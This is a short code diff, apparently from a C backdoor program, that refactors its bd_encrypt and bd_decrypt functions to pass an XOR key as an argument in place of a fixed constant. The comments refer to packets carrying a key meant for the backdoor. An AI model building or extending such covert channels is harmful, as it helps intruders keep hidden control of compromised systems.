@@ -33,7 +33,7 @@
 | ------------------------------------------------------------------------------
 */
 
-char *bd_encrypt(char *plaintext, int *msg_length){
+char *bd_encrypt(char *plaintext, int *msg_length, char *encrypt_key){
     
     /* Declare variables */
     
@@ -58,7 +58,7 @@ char *bd_encrypt(char *plaintext, int *msg_length){
     
     /* Encrypt */
     
-    xor_encrypt(hash, BD_ENCRYPT_KEY, hash_len);
+    xor_encrypt(hash, encrypt_key, hash_len);
     
     /* Prepend header key */
     
@@ -84,7 +84,7 @@ char *bd_encrypt(char *plaintext, int *msg_length){
 | ------------------------------------------------------------------------------
 */
 
-char *bd_decrypt(char *payload, int payload_len){
+char *bd_decrypt(char *payload, int payload_len, char *encrypt_key){
     
     /* Check the packet for the key meant for the backdoor */
     
@@ -107,7 +107,7 @@ char *bd_decrypt(char *payload, int payload_len){
     
     /* Decrypt message */
     
-    xor_encrypt(message, BD_ENCRYPT_KEY, message_len);
+    xor_encrypt(message, encrypt_key, message_len);
     
     /* Verify decryption succeeds by checking for header and footer */
     
